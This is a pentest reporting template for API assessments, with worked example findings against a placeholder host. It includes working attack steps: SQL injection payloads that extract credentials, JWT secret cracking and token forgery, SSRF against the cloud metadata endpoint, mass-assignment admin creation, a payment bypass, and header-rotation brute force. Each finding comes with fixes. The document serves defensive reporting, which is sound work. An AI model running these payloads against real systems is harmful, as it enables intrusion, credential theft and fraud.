#api-testing #reporting #pentest-report #findings #remediation #owasp #template

# API Penetration Test Reporting Template

Standardized format for documenting findings from API security assessments. Copy this file per engagement and fill in each section. See [[API-03-Request-Tracker]] for request logs and [[API-04-Evidence-Collection]] for evidence reference.

---

## Report Metadata

| Field | Value |
|-------|-------|
| **Engagement Name** | ________________ |
| **Client** | ________________ |
| **Report Version** | 1.0 (Draft) / 1.1 (Final) |
| **Assessment Type** | API Penetration Test |
| **Classification** | CONFIDENTIAL |
| **Testing Window** | ________________ to ________________ |
| **Report Date** | ________________ |
| **Lead Tester** | ________________ |
| **Reviewed By** | ________________ |

---

## 1. Executive Summary

> **Audience**: Non-technical stakeholders, management, CISO
> **Length**: 1 page maximum
> **Tone**: Business impact focused — avoid jargon

### Overall Risk Rating

**[ ] CRITICAL &nbsp;&nbsp; [ ] HIGH &nbsp;&nbsp; [ ] MEDIUM &nbsp;&nbsp; [ ] LOW**

> Circle the highest severity finding present. If multiple critical findings, note count.

### Summary Statement

[CLIENT NAME]'s [API NAME] was assessed for security vulnerabilities during [DATE RANGE]. The assessment identified **[X] critical**, **[X] high**, **[X] medium**, and **[X] low** severity findings across [X] endpoints tested.

The most significant findings relate to [brief description of top 2-3 themes, e.g., "broken authorization controls allowing any authenticated user to access other users' data, and missing rate limiting enabling credential brute force attacks"]. These findings represent direct risk to [client's core business concern — customer data, financial transactions, regulatory compliance, etc.].

### Key Findings Summary

| # | Finding | Severity | Business Impact |
|---|---------|----------|----------------|
| F001 | [Finding Title] | Critical | [One-line business impact] |
| F002 | [Finding Title] | High | [One-line business impact] |
| F003 | [Finding Title] | Medium | [One-line business impact] |

### Top 3 Recommendations

1. **[Immediate Action]** — [One sentence on what to fix and why it's urgent]
2. **[Short-term]** — [One sentence]
3. **[Longer-term]** — [One sentence]

---

## 2. Assessment Overview

### Scope

**In-Scope Endpoints**:
- Base URL: `https://api.target.com`
- API Version(s): ________________
- Authentication: [JWT / API Key / OAuth 2.0 / Other]
- Environment: [Production / Staging / Development]

**Out-of-Scope**:
- ________________
- ________________

**Test Accounts Provided**:

| Role | Username | Notes |
|------|----------|-------|
| Standard User A | ________________ | Primary test account |
| Standard User B | ________________ | Secondary (for BOLA testing) |
| Admin (read-only) | ________________ | For comparison only |

### Methodology

Testing followed the OWASP API Security Testing methodology, working through 8 phases:

| Phase | Description | Duration |
|-------|-------------|---------|
| Phase 1 | Reconnaissance & Mapping | __ hours |
| Phase 2 | Authentication Testing | __ hours |
| Phase 3 | Authorization Testing (BOLA/IDOR) | __ hours |
| Phase 4 | Input Validation & Injection | __ hours |
| Phase 5 | Business Logic Testing | __ hours |
| Phase 6 | Rate Limiting & Resource Management | __ hours |
| Phase 7 | Information Disclosure | __ hours |
| Phase 8 | Advanced Exploitation | __ hours |
| **Total** | | **__ hours** |

### Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Primary proxy, manual testing, intruder |
| Postman | Collection management, automated flows |
| jwt_tool | JWT analysis and exploitation |
| sqlmap | SQL injection verification |
| ffuf | Endpoint and parameter fuzzing |
| Python requests | Custom PoC scripting |
| grpcurl | gRPC testing (if applicable) |

### Limitations

- ________________ (e.g., testing conducted against staging — production may differ)
- ________________
- ________________

---

## 3. Findings Summary

### Severity Definitions

| Severity | CVSS Range | Description |
|----------|-----------|-------------|
| **Critical** | 9.0 – 10.0 | Immediate exploitation risk; severe business impact; data breach likely |
| **High** | 7.0 – 8.9 | Significant risk; exploitation likely with low effort; sensitive data at risk |
| **Medium** | 4.0 – 6.9 | Moderate risk; exploitation requires some conditions; limited impact alone |
| **Low** | 0.1 – 3.9 | Minor risk; exploitability constrained; minimal direct impact |
| **Informational** | N/A | Best practice deviation; no direct exploitability |

### Finding Count

| Severity | Count |
|----------|-------|
| Critical | |
| High | |
| Medium | |
| Low | |
| Informational | |
| **Total** | |

### Findings Index

| ID | Title | Severity | CVSS | OWASP API | Affected Endpoint |
|----|-------|----------|------|-----------|------------------|
| F001 | | Critical | | API1:2023 | |
| F002 | | High | | API2:2023 | |
| F003 | | High | | API3:2023 | |
| F004 | | Medium | | API8:2023 | |
| F005 | | Low | | API9:2023 | |

### OWASP API Security Top 10 Coverage

| OWASP Category | Tested | Finding ID(s) | Status |
|----------------|--------|---------------|--------|
| API1: BOLA | Yes | | Vulnerable / Not Vulnerable |
| API2: Broken Authentication | Yes | | |
| API3: Broken Object Property Level Auth | Yes | | |
| API4: Unrestricted Resource Consumption | Yes | | |
| API5: Broken Function Level Authorization | Yes | | |
| API6: Unrestricted Business Flows | Yes | | |
| API7: SSRF | Yes | | |
| API8: Security Misconfiguration | Yes | | |
| API9: Improper Inventory Management | Yes | | |
| API10: Unsafe Consumption of APIs | Yes | | |

---

## 4. Detailed Findings

### Finding Template

Duplicate this block for each new finding. Replace all `[bracketed]` placeholder text.

---

### F[###] — [Finding Title]

**Severity**: Critical / High / Medium / Low / Informational
**CVSS Score**: X.X
**CVSS Vector**: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**OWASP API**: API#:2023 — [Category Name]
**Affected Endpoint(s)**: `[METHOD /api/path/{param}]`
**RT Reference**: RT-[XXX]

#### Description

[2-3 sentences: what the vulnerability is, why it exists]

#### Business Impact

[2-3 sentences: what an attacker can do, what data/functionality is at risk, regulatory/financial impact]

#### Steps to Reproduce

1. Authenticate as [User A / attacker role]
2. [Action taken]
3. Observe [expected vs actual result]

#### Evidence

[Screenshot reference from API-04 — e.g., `bola-get-user-profile-403-vs-200.png`]

**Request:**
```http
[Paste raw HTTP request or cURL here]
```

**Response:**
```json
[Relevant portion of response]
```

#### Recommendation

**Immediate**: [Specific action to take now — e.g., enforce server-side ownership check]

**Long-term**: [Architectural or code-level fix — e.g., migrate to UUIDs, add RBAC middleware]

**References**: [OWASP link or CWE — e.g., https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/]

---

---

### F001 — Broken Object Level Authorization (BOLA)

**Severity**: Critical
**CVSS Score**: 8.1
**CVSS Vector**: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**OWASP API**: API1:2023 — Broken Object Level Authorization
**Affected Endpoint(s)**: `GET /api/users/{id}/profile`, `GET /api/orders/{id}`, `DELETE /api/documents/{id}`
**RT Reference**: RT-301, RT-302, RT-303

#### Description

The API fails to verify that the authenticated user is authorized to access the requested object. Any authenticated user can access or manipulate resources belonging to other users by substituting a different numeric ID in the URL path. This is the most common and impactful API vulnerability class.

#### Business Impact

An authenticated attacker can enumerate and read any user's profile data, order history, and documents — including PII (name, address, SSN), financial records, and private files. The DELETE endpoint allows permanent deletion of other users' data. With approximately [X] registered users, the full customer dataset is at risk. Depending on jurisdiction, this may constitute a reportable data breach under GDPR, CCPA, or HIPAA.

#### Steps to Reproduce

1. Authenticate as User A (ID: 100), capture the Bearer token
2. Send the following request substituting User B's ID (101):

```http
GET /api/users/101/profile HTTP/1.1
Host: api.target.com
Authorization: Bearer [USER_A_TOKEN]
Content-Type: application/json
```

3. Observe the response returns User B's complete profile data including PII

```json
HTTP/1.1 200 OK

{
  "id": 101,
  "email": "victim@example.com",
  "first_name": "Jane",
  "last_name": "Doe",
  "ssn": "123-45-6789",
  "address": "123 Main St",
  "phone": "555-1234"
}
```

4. Repeat with sequential IDs (1-1000) to enumerate all users

**cURL PoC**:
```bash
curl -X GET 'https://api.target.com/api/users/101/profile' \
  -H 'Authorization: Bearer [USER_A_TOKEN]'
```

#### Evidence

- `ACME_BOLA_F001_01_Request.png` — Request with User A token, User B ID
- `ACME_BOLA_F001_02_Response.png` — Full PII response
- `ACME_BOLA_F001_03_Delete-Confirmed.png` — Successful delete of User B's document

#### Recommendation

**Immediate**:
- Implement server-side ownership checks on every object-level operation
- The check must compare the authenticated user's ID against the resource owner, not rely on the client to supply the correct ID

**Long-term**:
- Adopt an authorization framework (e.g., OPA, Casbin) with centralized policy enforcement
- Implement indirect reference maps — map external IDs to internal resources per-user session so IDs cannot be guessed across users
- Add automated BOLA testing to CI/CD pipeline using tools like [OWASP ZAP](https://owasp.org/www-project-zap/)

**Server-side fix example (Node.js)**:
```javascript
// INSECURE — trusts client-supplied ID
app.get('/api/users/:id/profile', async (req, res) => {
  const user = await User.findById(req.params.id);
  return res.json(user);
});

// SECURE — verifies ownership
app.get('/api/users/:id/profile', authenticate, async (req, res) => {
  if (req.user.id !== parseInt(req.params.id)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const user = await User.findById(req.params.id);
  return res.json(user);
});
```

**References**: [OWASP API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) | CWE-639

---

### F002 — JWT Algorithm Confusion / Weak Secret

**Severity**: Critical
**CVSS Score**: 9.1
**CVSS Vector**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OWASP API**: API2:2023 — Broken Authentication
**Affected Endpoint(s)**: All authenticated endpoints
**RT Reference**: RT-202, RT-203

#### Description

The API accepts JWT tokens signed with a weak secret (`secret123`) that was recovered via offline brute force in under 60 seconds. An attacker who obtains any valid JWT can crack the signing secret and forge arbitrary tokens — including tokens claiming admin roles or other users' identities.

#### Business Impact

An attacker can authenticate as any user in the system, including administrators, without knowing any credentials. This grants full control over all API functionality, enables access to all user data, and allows destructive administrative actions. Combined with the BOLA finding (F001), an attacker can enumerate then impersonate all users.

#### Steps to Reproduce

1. Obtain any valid JWT from an authenticated session
2. Brute force the signing secret:

```bash
python3 jwt_tool.py [TOKEN] -C -d /usr/share/wordlists/rockyou.txt
# Result: Secret found: "secret123"
```

3. Forge a new token with elevated claims:

```bash
# Modify payload to claim admin role
python3 jwt_tool.py [TOKEN] -T -S hs256 -p "secret123"
# Change "role": "user" → "role": "admin"
# Change "sub": "123" → "sub": "1" (admin user ID)
```

4. Send forged token to any endpoint — admin access granted

#### Evidence

- `ACME_Auth_F002_01_JWT-Cracked.png` — jwt_tool output showing secret
- `ACME_Auth_F002_02_Forged-Token.png` — Modified token with admin claims
- `ACME_Auth_F002_03_Admin-Access.png` — Access to `/api/admin/` with forged token

#### Recommendation

**Immediate**:
- Rotate the JWT signing secret immediately — all existing tokens are compromised
- Use a cryptographically strong secret (minimum 256 bits / 32 random bytes): `openssl rand -hex 32`
- Consider switching to RS256 (asymmetric) — private key signs, public key verifies; theft of the public key cannot be used to forge tokens

**Long-term**:
- Enforce server-side role validation — do not rely solely on JWT claims; verify role against the database
- Implement token revocation (Redis blocklist or short expiry + refresh token rotation)
- Disable `alg: none` at the library level

**References**: [OWASP API2:2023](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/) | CWE-327 | CVE-2015-9235

---

### F003 — SQL Injection

**Severity**: Critical
**CVSS Score**: 9.8
**CVSS Vector**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**OWASP API**: API10:2023 — Unsafe Consumption (Injection)
**Affected Endpoint(s)**: `GET /api/products?search=`
**RT Reference**: RT-501, RT-502

#### Description

The `search` query parameter is passed directly to a SQL query without sanitization or parameterization. An attacker can inject arbitrary SQL to extract all database contents, bypass authentication, or modify/delete data.

#### Business Impact

Complete database compromise. An attacker can extract all user credentials, PII, order history, payment records, and internal configuration. Depending on database user permissions, this may extend to file system read/write, OS command execution (via `xp_cmdshell` on MSSQL or UDF on MySQL), and lateral movement within the infrastructure.

#### Steps to Reproduce

1. Send a request with a basic injection payload:

```http
GET /api/products?search=' OR '1'='1 HTTP/1.1
Host: api.target.com
Authorization: Bearer [TOKEN]
```

2. Observe all products returned (including hidden ones), confirming injection
3. Determine column count via UNION:

```
/api/products?search=' UNION SELECT NULL,NULL,NULL--
```

4. Extract database version:

```
/api/products?search=' UNION SELECT NULL,@@version,NULL--
```

5. Extract user credentials:

```
/api/products?search=' UNION SELECT NULL,username,password FROM users--
```

**cURL PoC**:
```bash
curl -G 'https://api.target.com/api/products' \
  --data-urlencode "search=' OR '1'='1" \
  -H 'Authorization: Bearer [TOKEN]'
```

#### Evidence

- `ACME_SQLi_F003_01_Payload.png` — Injection payload in request
- `ACME_SQLi_F003_02_All-Products.png` — All products returned including hidden
- `ACME_SQLi_F003_03_Version.png` — Database version extracted
- `ACME_SQLi_F003_04_Credentials.png` — User table extracted (REDACTED)

#### Recommendation

**Immediate**:
- Parameterize all database queries — never concatenate user input into SQL strings
- Deploy WAF rule to detect and block SQL injection patterns as a temporary mitigation

**Long-term**:
- Use an ORM (Sequelize, SQLAlchemy, Hibernate) which parameterizes by default
- Implement least-privilege database accounts — the API user should have only SELECT on required tables; never DBA rights
- Enable query logging and alert on anomalous queries

**Parameterized query fix**:
```javascript
// INSECURE
const query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;

// SECURE — parameterized
const query = 'SELECT * FROM products WHERE name LIKE ?';
const results = await db.execute(query, [`%${req.query.search}%`]);
```

**References**: [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) | CWE-89

---

### F004 — Mass Assignment

**Severity**: High
**CVSS Score**: 8.8
**CVSS Vector**: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**OWASP API**: API3:2023 — Broken Object Property Level Authorization
**Affected Endpoint(s)**: `POST /api/users/register`, `PATCH /api/users/profile`
**RT Reference**: RT-401, RT-402

#### Description

The API binds client-supplied JSON properties directly to internal data models without filtering. An attacker can include fields such as `role`, `is_admin`, `is_verified`, and `credits` in registration or profile update requests — and the API accepts and persists them.

#### Business Impact

An attacker can create accounts with administrative privileges, bypass email verification, and manipulate account balance or credits. Admin accounts can perform any privileged action in the system, including accessing all user data, modifying pricing, and deleting records.

#### Steps to Reproduce

1. Register a new account with additional privileged fields:

```http
POST /api/users/register HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "password": "Password123!",
  "role": "admin",
  "is_verified": true,
  "credits": 999999
}
```

2. Observe the response — all fields accepted:

```json
HTTP/1.1 201 Created

{
  "id": 500,
  "email": "attacker@evil.com",
  "role": "admin",
  "is_verified": true,
  "credits": 999999
}
```

3. Authenticate and confirm access to `/api/admin/*` endpoints

#### Evidence

- `ACME_MassAssign_F004_01_Request.png` — Modified registration with extra fields
- `ACME_MassAssign_F004_02_Response.png` — Fields accepted in response
- `ACME_MassAssign_F004_03_Admin-Access.png` — Admin endpoint accessed

#### Recommendation

**Immediate**:
- Implement an explicit allowlist of writable fields per endpoint
- Reject or strip any properties not on the allowlist

**Long-term**:
- Use DTOs (Data Transfer Objects) / request validation schemas — define exactly what fields are accepted at each endpoint
- Never auto-bind request bodies to ORM models directly

**Allowlist fix example**:
```javascript
// INSECURE — binds entire request body
const user = new User(req.body);

// SECURE — explicit allowlist
const { email, password } = req.body;
const user = new User({ email, password });
// role, is_admin, credits are never touched
```

**References**: [OWASP API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) | CWE-915

---

### F005 — Business Logic — Payment Bypass

**Severity**: Critical
**CVSS Score**: 9.1
**CVSS Vector**: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
**OWASP API**: API6:2023 — Unrestricted Access to Sensitive Business Flows
**Affected Endpoint(s)**: `POST /api/cart/checkout`, `GET /api/order/{id}/confirm`
**RT Reference**: RT-801

#### Description

The order confirmation endpoint does not verify that payment was successfully processed before confirming an order. An attacker can create an order, skip the payment step entirely, and call the confirmation endpoint directly — receiving goods or services without paying.

#### Business Impact

Direct financial loss on every transaction. An attacker can automate this to place unlimited free orders. The vulnerability requires only a standard authenticated account and knowledge of the order ID (which is returned by the checkout endpoint).

#### Steps to Reproduce

1. Add item to cart and initiate checkout:

```bash
curl -X POST 'https://api.target.com/api/cart/checkout' \
  -H 'Authorization: Bearer [TOKEN]' \
  -d '{"cart_id": 1}'
# Response: {"order_id": 12345, "total": 500.00}
```

2. Skip payment — do NOT call `POST /api/payment/process`

3. Call confirmation directly:

```bash
curl -X GET 'https://api.target.com/api/order/12345/confirm' \
  -H 'Authorization: Bearer [TOKEN]'
# Response: {"status": "confirmed", "payment_status": "pending"}
```

4. Order is confirmed — item will be fulfilled despite no payment

#### Evidence

- `ACME_BizLogic_F005_01_Checkout-Response.png` — order_id received
- `ACME_BizLogic_F005_02_Confirm-Request.png` — Direct to confirm, skipping payment
- `ACME_BizLogic_F005_03_Order-Confirmed.png` — Confirmed with payment_status: pending

#### Recommendation

**Immediate**:
- The confirmation endpoint must query payment status from the payment service before confirming — never trust client-side state
- Add a mandatory payment verification step server-side before transitioning order status

**Long-term**:
- Implement a server-side state machine for order flow — orders can only transition to `confirmed` from `payment_successful`; any other transition is rejected
- Log and alert on any attempt to access `/confirm` with an unpaid order

**References**: [OWASP API6:2023](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)

---

### F006 — Server-Side Request Forgery (SSRF)

**Severity**: Critical
**CVSS Score**: 9.1
**CVSS Vector**: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
**OWASP API**: API7:2023 — Server-Side Request Forgery
**Affected Endpoint(s)**: `POST /api/webhook`
**RT Reference**: RT-1201

#### Description

The webhook URL parameter accepts arbitrary URLs and the server makes an unauthenticated HTTP request to the supplied destination without validation. An attacker can point this to internal services or cloud metadata endpoints, causing the API server to proxy requests on their behalf.

#### Business Impact

On cloud-hosted infrastructure, this exposes AWS/Azure/GCP instance metadata including IAM credentials. With leaked credentials, an attacker can pivot to the cloud control plane — accessing S3 buckets, RDS databases, secrets manager, and other cloud resources. On-premise, this enables internal network scanning and access to services not exposed externally (admin panels, monitoring systems, databases).

#### Steps to Reproduce

1. Send request with AWS metadata endpoint as webhook URL:

```http
POST /api/webhook HTTP/1.1
Host: api.target.com
Authorization: Bearer [TOKEN]
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

2. Response contains IAM role name:

```json
{"content": "api-server-role"}
```

3. Fetch credentials:

```json
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/api-server-role"
}
```

4. Response:

```json
{
  "content": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"[REDACTED]\",\"Token\":\"[REDACTED]\"}"
}
```

#### Evidence

- `ACME_SSRF_F006_01_Metadata-Request.png` — Webhook set to metadata URL
- `ACME_SSRF_F006_02_Credentials-REDACTED.png` — AWS credentials in response

#### Recommendation

**Immediate**:
- Block requests to link-local ranges (`169.254.0.0/16`), loopback (`127.0.0.0/8`), and RFC-1918 private ranges at the application layer
- On AWS: enable IMDSv2 (requires token-based requests — SSRF cannot use it)

**Long-term**:
- Implement allowlist of permitted webhook destinations — reject anything not on the list
- Make outbound webhook requests from a dedicated isolated service with no cloud metadata access
- Use DNS rebinding protection (validate IP after DNS resolution, not before)

**References**: [OWASP API7:2023](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/) | CWE-918

---

### F007 — Missing Rate Limiting on Authentication Endpoint

**Severity**: High
**CVSS Score**: 7.5
**CVSS Vector**: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`
**OWASP API**: API4:2023 — Unrestricted Resource Consumption
**Affected Endpoint(s)**: `POST /api/login`
**RT Reference**: RT-1001

#### Description

The login endpoint does not enforce rate limiting. Additionally, the rate limiting that exists is based solely on IP address and can be bypassed by rotating the `X-Forwarded-For` header. An attacker can perform unlimited credential brute force attempts against any account.

#### Business Impact

Any account with a weak or common password is susceptible to automated credential stuffing or brute force attacks. Credential databases from third-party breaches can be tested against user accounts with no friction or detection.

#### Steps to Reproduce

1. Confirm rate limiting is bypassed via header rotation (Burp Intruder):

```http
POST /api/login HTTP/1.1
Host: api.target.com
X-Forwarded-For: §1.2.3.4§
Content-Type: application/json

{"username": "admin", "password": "§password§"}
```

- Payload 1: `X-Forwarded-For` — Numbers sequential (1-255)
- Payload 2: Passwords — from `rockyou.txt`

2. Result: 1,000+ attempts sent with no 429 response

#### Evidence

- `ACME_RateLimit_F007_01_Intruder-Config.png` — Burp Intruder with IP rotation
- `ACME_RateLimit_F007_02_No-Block.png` — All requests returning 200/401, no 429

#### Recommendation

**Immediate**:
- Implement rate limiting that cannot be bypassed via `X-Forwarded-For` — use a combination of user identity + device fingerprint, not just IP
- Add CAPTCHA after 3-5 failed attempts per account
- Lock account for 15 minutes after 10 failed attempts (with exponential backoff)

**Long-term**:
- Integrate threat intelligence to block known credential-stuffing IP ranges
- Alert on high-velocity login failures per account or per originating IP/ASN
- Implement passwordless or MFA to reduce credential attack surface

**References**: [OWASP API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/) | CWE-307

---

### F008 — Excessive Data Exposure

**Severity**: Medium
**CVSS Score**: 6.5
**CVSS Vector**: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**OWASP API**: API3:2023 — Broken Object Property Level Authorization
**Affected Endpoint(s)**: `GET /api/users/me`
**RT Reference**: RT-1102

#### Description

The `/api/users/me` endpoint returns significantly more data than the client requires, including password hashes, SSN, internal notes, failed login counts, and security questions. The API exposes the full internal user model rather than a filtered response appropriate for the user's own profile view.

#### Business Impact

Password hashes can be cracked offline to recover plaintext passwords (enabling account takeover and credential stuffing against other services). SSN exposure may constitute a HIPAA/PCI violation. Internal fields (flags, notes) may reveal information useful for further attacks.

#### Steps to Reproduce

```bash
curl -X GET 'https://api.target.com/api/users/me' \
  -H 'Authorization: Bearer [TOKEN]'
```

Response includes:
```json
{
  "id": 123,
  "email": "user@example.com",
  "password_hash": "$2b$10$...",       ← should never be returned
  "ssn": "123-45-6789",                ← PII
  "internal_notes": "VIP customer",   ← internal field
  "is_admin": false,                   ← useful to attackers
  "failed_login_attempts": 0,          ← security metadata
  "security_question": "Pet's name?"   ← enables social engineering
}
```

#### Evidence

- `ACME_InfoDisc_F008_01_Response-REDACTED.png` — Full response with sensitive fields highlighted

#### Recommendation

**Immediate**:
- Remove `password_hash`, `ssn`, `internal_notes`, `failed_login_attempts`, and `security_question` from all API responses
- Return only fields required for the specific use case

**Long-term**:
- Define explicit response schemas per endpoint — use serializer/serializer patterns to whitelist output fields
- Implement field-level authorization for sensitive attributes (admin-only fields only visible to admin)

**References**: [OWASP API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) | CWE-213

---

### F009 — CORS Misconfiguration

**Severity**: Medium
**CVSS Score**: 6.1
**CVSS Vector**: `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OWASP API**: API8:2023 — Security Misconfiguration
**Affected Endpoint(s)**: All authenticated endpoints
**RT Reference**: RT-1101

#### Description

The API reflects the `Origin` header back in `Access-Control-Allow-Origin` without validation, and includes `Access-Control-Allow-Credentials: true`. Any website can make authenticated cross-origin requests to the API using the victim's session credentials, enabling cross-site request forgery and data exfiltration.

#### Business Impact

A malicious website visited by an authenticated user can silently make API requests on their behalf and read the responses — including profile data, order history, and other sensitive information. This effectively enables CSRF with response reading, which standard CSRF tokens do not prevent.

#### Steps to Reproduce

1. Send request with arbitrary origin:

```http
GET /api/users/me HTTP/1.1
Host: api.target.com
Origin: https://evil.attacker.com
Authorization: Bearer [TOKEN]
```

2. Response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.attacker.com
Access-Control-Allow-Credentials: true
```

3. Any page on `evil.attacker.com` can now read authenticated API responses via JavaScript `fetch()`

#### Evidence

- `ACME_CORS_F009_01_Request.png` — Arbitrary origin in request
- `ACME_CORS_F009_02_Response-Headers.png` — Reflected origin with credentials: true

#### Recommendation

**Immediate**:
- Maintain an explicit allowlist of trusted origins; do not reflect arbitrary origins
- If `Allow-Credentials: true` is required, only allow it for specific trusted origins

**Allowlist fix**:
```javascript
const allowedOrigins = ['https://app.yourdomain.com', 'https://admin.yourdomain.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

**References**: [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny) | CWE-942

---

## 5. Remediation Roadmap

Prioritized remediation schedule based on severity and exploitability:

### Immediate (0–7 days) — Critical

| # | Finding | Action |
|---|---------|--------|
| F001 | BOLA | Add server-side ownership checks to all object endpoints |
| F002 | JWT Weak Secret | Rotate signing secret; invalidate all existing tokens |
| F003 | SQL Injection | Parameterize all database queries |
| F005 | Payment Bypass | Enforce payment verification before order confirmation |
| F006 | SSRF | Block internal IP ranges; enable IMDSv2 |

### Short-term (1–4 weeks) — High

| # | Finding | Action |
|---|---------|--------|
| F004 | Mass Assignment | Implement field allowlists on all write endpoints |
| F007 | Rate Limiting | Add account-level rate limiting with lockout |

### Medium-term (1–3 months) — Medium

| # | Finding | Action |
|---|---------|--------|
| F008 | Excessive Data Exposure | Define response schemas; remove sensitive fields |
| F009 | CORS Misconfiguration | Implement origin allowlist |

### Verification

After remediation, retest all findings and confirm:
- [ ] Critical/High findings fully remediated
- [ ] No regression in previously passing tests
- [ ] New tests pass for remediated functionality

---

## 6. Appendices

### Appendix A: CVSS v3.1 Scoring Reference

| Metric | Value | Description |
|--------|-------|-------------|
| **AV** (Attack Vector) | N=Network, A=Adjacent, L=Local, P=Physical | |
| **AC** (Attack Complexity) | L=Low, H=High | |
| **PR** (Privileges Required) | N=None, L=Low, H=High | |
| **UI** (User Interaction) | N=None, R=Required | |
| **S** (Scope) | U=Unchanged, C=Changed | |
| **C/I/A** (Impact) | N=None, L=Low, H=High | |

Calculator: https://www.first.org/cvss/calculator/3.1

### Appendix B: Testing Environment Details

| Item | Value |
|------|-------|
| API Base URL | ________________ |
| Testing IP(s) | ________________ |
| Test Account - User A | ________________ |
| Test Account - User B | ________________ |
| Burp Project File | [Engagement]_API_Project.burp |
| Request Tracker | [[API-03-Request-Tracker]] |
| Evidence Location | [Engagement]-Evidence/ |

### Appendix C: Glossary

| Term | Definition |
|------|-----------|
| BOLA | Broken Object Level Authorization — API version of IDOR |
| IDOR | Insecure Direct Object Reference |
| BFLA | Broken Function Level Authorization |
| JWT | JSON Web Token — stateless authentication token |
| SSRF | Server-Side Request Forgery |
| Mass Assignment | Binding user-supplied fields directly to internal data models |
| XXE | XML External Entity injection |
| CORS | Cross-Origin Resource Sharing |

---

## Related Documents
- [[API-00-Overview|Overview]]
- [[API-01-Admin-Checklist|Admin Checklist]]
- [[API-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[API-03-Request-Tracker|Request Tracker]]
- [[API-04-Evidence-Collection|Evidence Collection]]
- [[API-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-03-06*
*Updated: 2026-03-06*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.6*
